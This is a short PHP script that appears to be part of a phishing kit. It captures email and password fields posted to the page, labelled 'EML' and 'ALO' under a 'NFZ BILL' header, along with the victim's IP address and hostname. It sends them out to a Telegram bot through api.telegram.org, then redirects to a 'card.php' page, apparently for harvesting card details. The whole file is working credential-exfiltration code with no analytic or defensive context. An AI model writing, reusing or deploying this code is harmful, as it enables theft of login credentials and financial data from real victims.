<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "---------- NFZ BILL ----------\n";
$message .= "EML     : ".$_POST['eml']."\n";
$message .= "ALO     : ".$_POST['allo']."\n";
$message .= "-----------  Z3CI   -----------\n";
$message .= "lp      : $ip\n";
$message .= "H0ST    : $hostname\n";

include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: card.php");

?>